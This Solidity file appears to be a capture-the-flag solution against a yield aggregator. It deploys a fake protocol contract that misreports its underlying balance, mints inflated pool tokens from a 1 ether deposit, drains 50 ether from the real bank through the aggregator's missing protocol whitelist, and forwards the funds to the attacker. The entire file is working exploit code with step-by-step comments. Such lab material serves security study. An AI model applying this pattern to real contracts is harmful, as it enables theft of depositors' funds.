pragma solidity 0.8.0;

import "./YieldAggregator.sol";
import "./SetupYieldAggregator.sol";

// total copy of the minibank except the `balanceUnderlying` function
contract FakeMiniBank is Protocol {

    ERC20Like public override underlying;

    uint256 public fakeUnderlyingBalance;

    constructor(address _underlying) {
        underlying = ERC20Like(_underlying);
    }

    mapping (address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(uint256 amount) public override {
        require(underlying.transferFrom(msg.sender, address(this), amount));
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        // Depositing 1 ether but increasing the `fakeUnderlyingBalance` by 100 ether to get more pool tokens on the aggregator
        fakeUnderlyingBalance += 100 ether;
    }

    function burn(uint256 amount) public override {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        require(underlying.transfer(msg.sender, amount));
    }

    // I have changed this function:
    function balanceUnderlying() public override view returns (uint256) {
        return fakeUnderlyingBalance;
    }

    function rate() public override view returns (uint256) {
        return 1;
    }
}


contract ExploitYeild {

    YieldAggregator public aggregator;
    MiniBank public bank;
    iWETH9 public weth;

    FakeMiniBank public fakeBank;

    constructor(address _aggregator, address _bank, address _weth) {
        aggregator = YieldAggregator(_aggregator);
        bank = MiniBank(_bank);
        weth = iWETH9(_weth);
        fakeBank = new FakeMiniBank(_weth);
    }

    function execute() public payable {

        // deposit 1 ether
        require(msg.value == 1 ether);

        // change ETH to wETH
        weth.deposit{value: msg.value}();

        // approve for the aggregator to withdraw 1 ether on the `ExploitYeild` behalf
        weth.approve(address(aggregator), msg.value);
        
        // setup the erc20 token address
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        // setup the amount money to deposit 1 ether, but eventually can be any value 
        // since in FakeMiniBank we hardcoded amount of money we want to steal
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 1 ether;

        // deposit to our FakeMiniBank 1 ether and get 100 ether poolTokens
        aggregator.deposit(Protocol(address(fakeBank)), _tokens, _amounts);

        // withdraw our 1 ether from the FakeMiniBank contract, remained 99 ether of poolTokens
        _amounts[0] = 1 ether;
        aggregator.withdraw(Protocol(address(fakeBank)), _tokens, _amounts);

        // since we have 99 poolTokens we can withdraw 50 ether from the bank
        // the aggregator does not maintain the whitelist of the supported protocols (banks)
        _amounts[0] = 50 ether;
        aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts);

        // we have 51 ether on the balance we convert wETH to ETH
        weth.withdraw(weth.balanceOf(address(this)));

        // send ETH to out attacker account
        (bool sent,) = msg.sender.call{value: address(this).balance, gas: 1024}("");
        require(sent, "Money are not transaferred");

    }

    receive() external payable {}

}

